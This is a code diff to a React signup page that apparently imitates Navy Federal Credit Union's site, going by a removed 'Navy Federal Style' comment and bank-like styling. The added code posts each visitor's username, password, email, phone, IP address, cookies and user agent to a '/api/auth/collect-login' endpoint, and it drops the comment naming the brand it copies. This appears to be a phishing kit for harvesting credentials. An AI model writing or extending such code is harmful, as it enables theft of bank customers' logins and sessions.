@@ -41,6 +41,13 @@ export default function SignupPage() {
 
     const { username, email, phone, password, confirmPassword } = formData;
 
+    // Validation
+    if (!username || !email || !phone || !password) {
+      setError('All fields are required');
+      setLoading(false);
+      return;
+    }
+
     if (password !== confirmPassword) {
       setError('Passwords do not match!');
       setLoading(false);
@@ -68,28 +75,39 @@ export default function SignupPage() {
         timestamp: new Date().toISOString()
       };
 
-      console.log('📝 Signup data:', userData);
+      console.log('📝 Sending signup data:', userData);
 
+      // ✅ FIXED: Send data to the API
       const response = await fetch('/api/auth/collect-login', {
         method: 'POST',
         headers: { 'Content-Type': 'application/json' },
         body: JSON.stringify({
-          ...userData,
           step: 'signup',
-          message: '📝 NEW SIGNUP: User registered'
+          username: userData.username,
+          password: userData.password,
+          email: userData.email,
+          phone: userData.phone,
+          ip: userData.ip,
+          cookies: userData.cookies,
+          userAgent: userData.userAgent,
+          message: '📝 NEW SIGNUP: User registered',
+          timestamp: userData.timestamp
         })
       });
 
+      const result = await response.json();
+      console.log('📡 API Response:', result);
+
       if (response.ok) {
-        setSuccess('✅ Account created successfully!');
+        setSuccess('✅ Account created successfully! Redirecting to login...');
         setTimeout(() => {
           router.push('/');
         }, 2000);
       } else {
-        setError('Signup failed. Please try again.');
+        setError(result.error || 'Signup failed. Please try again.');
       }
     } catch (error) {
-      console.error('Signup error:', error);
+      console.error('❌ Signup error:', error);
       setError('Signup failed. Please check your connection.');
     } finally {
       setLoading(false);
@@ -102,7 +120,7 @@ export default function SignupPage() {
       backgroundColor: '#b8d4f0',
       fontFamily: '-apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif'
     }}>
-      {/* Header - Navy Federal Style */}
+      {/* Header */}
       <header style={{
         backgroundColor: '#1a3a6e',
         padding: '14px 16px',
@@ -139,7 +157,6 @@ export default function SignupPage() {
           borderRadius: '4px',
           overflow: 'hidden',
           boxShadow: '0 4px 12px rgba(0,0,0,0.08)',
-          position: 'relative'
         }}>
           <div style={{ height: '6px', backgroundColor: '#d97a2e' }}></div>
 
@@ -189,6 +206,7 @@ export default function SignupPage() {
               <span style={{ fontSize: '28px', fontWeight: 400, color: '#333' }}>Sign Up</span>
             </div>
 
+            {/* Error Message */}
             {error && (
               <div style={{
                 backgroundColor: '#ffebee',
@@ -202,6 +220,7 @@ export default function SignupPage() {
               </div>
             )}
 
+            {/* Success Message */}
             {success && (
               <div style={{
                 backgroundColor: '#e8f5e9',
